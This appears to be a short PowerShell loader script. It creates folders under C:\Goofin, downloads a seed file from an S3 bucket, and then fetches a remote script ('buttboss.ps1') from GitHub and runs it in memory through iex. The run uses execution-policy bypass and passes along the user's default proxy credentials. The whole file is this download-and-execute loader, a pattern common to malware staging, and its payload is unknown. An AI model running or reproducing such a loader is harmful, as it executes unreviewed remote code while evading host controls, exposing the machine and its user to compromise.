# Loader script

# Create goofin/butts goofin/cuts and the seeds for grand plan
Mkdir "C:\Goofin\butts"
Mkdir "C:\Goofin\cuts" 
Invoke-WebRequest -Uri "https://buttboss.s3.us-east-1.amazonaws.com/buttseeds.txt" -O "C:\Goofin\buttseeds.txt"


# Grab buttboss from github and execute in memory
# 
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://raw.githubusercontent.com/mellonaut/ButtBoss/main/buttboss.ps1')|iex"

